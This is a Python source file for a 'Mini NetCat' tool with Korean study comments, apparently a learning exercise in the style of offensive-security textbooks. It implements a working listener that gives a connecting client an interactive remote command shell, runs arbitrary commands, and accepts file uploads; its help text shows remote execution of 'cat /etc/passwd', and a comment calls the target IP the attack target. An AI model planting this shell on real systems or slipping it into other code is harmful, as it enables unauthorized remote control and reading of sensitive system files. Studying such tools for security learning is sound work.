import argparse  # create command line interface
import shlex
import socket
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
  # strip : removal of leading/trailing whitespace | 앞 뒤 \n이나 space, \t, \r 제거
  cmd = cmd.strip()

  if not cmd:
    return

  # subprocss = 프로세스 생성에 인터페이스를 제공하는 강력한 방법 / 클라이언트 프로그램과 통신할 때 다양한 방법을 제공해준다.
  # check_output = 대상 OS에서 명령어를 수행한 후 결과값을 반환
  output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)

  return output.decode()


class NetCat:
  def __init__(self, args, buffer=None):
    self.args = args
    self.buffer = buffer
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  def run(self):
    if self.args.listen:
      self.listen()
    else:
      self.send()

  def send(self):
    self.socket.connect((self.args.target, self.args.port))

    if self.buffer:
      self.socket.send(self.buffer)

    try:
      while True:
        recv_len = 1
        response = ""

        while recv_len:
          data = self.socket.recv(4096)
          recv_len = len(data)
          response += data.decode()
          if recv_len < 4096:
            break

        if response:
          print(response)
          buffer = input("> ")
          buffer += "\n"
          self.socket.send(buffer.encode())
    except KeyboardInterrupt:
      print("User Terminated")
      self.socket.close()
      sys.exit()

  def listen(self):
    print("Listening")
    self.socket.bind((self.args.target, self.args.port))
    self.socket.listen(5)  # connection MAX Limit = 5

    while True:
      client_socket, _ = self.socket.accept()
      client_thread = threading.Thread(target=self.handle, args=(client_socket,))
      client_thread.start()

  # handle file upload, execute command and interactive Shell
  def handle(self, client_socket):
    if self.args.execute:
      output = execute(self.args.execute)
      client_socket.send(output.encode())

    elif self.args.upload:
      file_buffer = b""
      while True:
        data = client_socket.recv(4096)
        if data:
          file_buffer += data
          print(len(file_buffer))
        else:
          break
      with open(self.args.upload, "wb") as f:
        f.write(file_buffer)
      message = f"Saved file {self.args.upload}"
      client_socket.send(message.encode())

    elif self.args.command:
      cmd_buffer = b""
      while True:
        try:
          client_socket.send(b" #> ")
          while "\n" not in cmd_buffer.decode():
            cmd_buffer += client_socket.recv(64)
          response = execute(cmd_buffer.decode())

          if response:
            client_socket.send(response.encode())
          cmd_buffer = b""
        except Exception as e:
          print(f"Server killed {e}")
          self.socket.close()
          sys.exit()


if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description="Mini NetCat(nc)",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent(
      """Example:
      netcat.py -t 192.168.1.108 -p 5555 -l -c # Shell Command
      netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.whatisup # File Upload
      netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # Execute command
      echo "ABCDEFGHI" | ./netcat.py -t 192.168.1.108 -p 135 # send local text input to 135 port of server 
      netcat.py -t 192.168.1.108 -p 5555
      """
    ),
  )

  parser.add_argument(
    "-c",
    "--command",
    action="store_true",
    help="initialize command shell",  # 대화형 Shell 구성
  )
  parser.add_argument(
    "-e", "--execute", help="execute specifed command"
  )  # (수신 관련) 특정 명령어 하나를 실행하기 원할 때
  parser.add_argument(
    "-l", "--listen", action="store_true", help="listen"
  )  # (수신 관련)  수신측에서 반드시 설정
  parser.add_argument(
    "-p", "--port", type=int, default=5555, help="specified port"
  )  # (송신 관련) 통신에 필요한 포트 번호
  parser.add_argument(
    "-t", "--target", default="192.168.1.203", help="specified ip"
  )  # (송신 관련) 공격 대상의 IP
  parser.add_argument(
    "-u", "--upload", help="upload file"
  )  # (수신 관련) 업로드 하고자 하는 파일의 이름 선택
  args = parser.parse_args()

  if args.listen:  # 수신측으로 프로그램 구동 시
    buffer = ""
  else:  # 송신측으로 프로그램 구동 시
    buffer = sys.stdin.read()
  nc = NetCat(args=args, buffer=buffer.encode("utf-8"))
  nc.run()
